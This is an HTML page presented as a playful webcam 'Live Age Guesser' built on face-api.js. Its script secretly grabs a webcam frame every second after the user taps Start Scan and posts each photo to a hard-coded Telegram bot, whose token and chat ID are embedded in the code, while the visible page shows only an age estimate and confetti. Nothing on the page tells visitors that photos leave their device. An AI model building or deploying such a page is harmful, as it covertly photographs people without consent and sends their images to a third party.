<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Live Age Guesser with Telegram Vibes</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.18.0/dist/tf.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
</head>
<body class="bg-gradient-to-r from-purple-600 to-blue-500 min-h-screen flex items-center justify-center">
  <div class="container mx-auto p-4">
    <h1 class="text-3xl sm:text-4xl font-bold text-white text-center mb-6 animate-pulse">Live Age Guesser ðŸ˜Ž</h1>
    <div class="bg-white rounded-lg shadow-2xl p-6 max-w-full sm:max-w-lg mx-auto">
      <video id="video" playsinline autoplay class="rounded-lg mb-4 w-full" style="aspect-ratio: 4/3;"></video>
      <canvas id="canvas" class="hidden"></canvas>
      <div class="text-center">
        <p id="ageDisplay" class="text-xl sm:text-2xl font-semibold text-gray-800 mb-4">Waiting for face...</p>
        <button id="startBtn" class="bg-blue-600 text-white px-8 py-4 rounded-full text-lg hover:bg-blue-700 transition duration-300">Start Scan</button>
        <button id="stopBtn" class="bg-red-600 text-white px-8 py-4 rounded-full text-lg hover:bg-red-700 transition duration-300 hidden">Stop Scan</button>
      </div>
    </div>
    <div id="confetti" class="fixed inset-0 pointer-events-none"></div>
  </div>

  <script>
    // Telegram Bot Config
    const TELEGRAM_BOT_TOKEN = '7698307988:AAHBp8rYcNP-XduoE3rzl4RexOjJvZTLrhA'; // Your bot token
    const TELEGRAM_CHAT_ID = '5281611284'; // Your chat ID

    // Webcam and Canvas Setup
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const ageDisplay = document.getElementById('ageDisplay');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    let stream = null;
    let intervalId = null;

    // Load face-api.js models
    async function loadModels() {
      await faceapi.nets.ssdMobilenetv1.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models');
      await faceapi.nets.ageGenderNet.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models');
      console.log('Models loaded');
    }

    // Start webcam with mobile camera support
    async function startWebcam() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
        });
        video.srcObject = stream;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        startBtn.classList.add('hidden');
        stopBtn.classList.remove('hidden');
        ageDisplay.textContent = 'Scanning face...';
        detectFaces();
        sendPhotoInterval();
      } catch (err) {
        console.error('Error accessing webcam:', err);
        ageDisplay.textContent = 'Please allow camera access!';
      }
    }

    // Stop webcam and photo sending
    function stopWebcam() {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;
        clearInterval(intervalId);
        startBtn.classList.remove('hidden');
        stopBtn.classList.add('hidden');
        ageDisplay.textContent = 'Waiting for face...';
      }
    }

    // Detect faces and estimate age
    async function detectFaces() {
      if (!video.srcObject) return;
      const detections = await faceapi.detectAllFaces(video).withAgeAndGender();
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      detections.forEach(det => {
        const age = Math.round(det.age);
        ageDisplay.textContent = `You look ~${age} years old!`;
        triggerConfetti();
        if (navigator.vibrate) navigator.vibrate(200); // Vibrate on detection (mobile)
      });
      if (detections.length === 0) {
        ageDisplay.textContent = 'No face detected!';
      }
      requestAnimationFrame(detectFaces);
    }

    // Send photo to Telegram every second
    async function sendPhotoInterval() {
      intervalId = setInterval(async () => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const photo = canvas.toDataURL('image/jpeg', 0.8);
        await sendPhotoToTelegram(photo);
      }, 1000);
    }

    // Send photo to Telegram
    async function sendPhotoToTelegram(base64Image) {
      try {
        const blob = await (await fetch(base64Image)).blob();
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'selfie.jpg');
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();
        if (!result.ok) console.error('Error sending photo:', result);
      } catch (err) {
        console.error('Error sending to Telegram:', err);
      }
    }

    // Confetti animation for fun
    function triggerConfetti() {
      const confetti = document.getElementById('confetti');
      confetti.innerHTML = '';
      const count = window.innerWidth < 640 ? 30 : 50;
      for (let i = 0; i < count; i++) {
        const div = document.createElement('div');
        div.className = 'absolute w-2 h-2 bg-yellow-400 rounded-full';
        div.style.left = `${Math.random() * 100}%`;
        div.style.top = `${Math.random() * 100}%`;
        div.style.animation = `fall ${Math.random() * 2 + 1}s linear`;
        confetti.appendChild(div);
      }
      setTimeout(() => confetti.innerHTML = '', 3000);
    }

    // Event listeners for touch and click
    startBtn.addEventListener('click', startWebcam);
    stopBtn.addEventListener('click', stopWebcam);

    // Load models on page load
    loadModels();

    // CSS for confetti animation and mobile touch
    const style = document.createElement('style');
    style.textContent = `
      @keyframes fall {
        0% { transform: translateY(-100vh); opacity: 1; }
        100% { transform: translateY(100vh); opacity: 0; }
      }
      button {
        -webkit-tap-highlight-color: transparent;
      }
      video {
        max-width: 100%;
        height: auto;
      }
    `;
    document.head.appendChild(style);
  </script>
</body>
</html>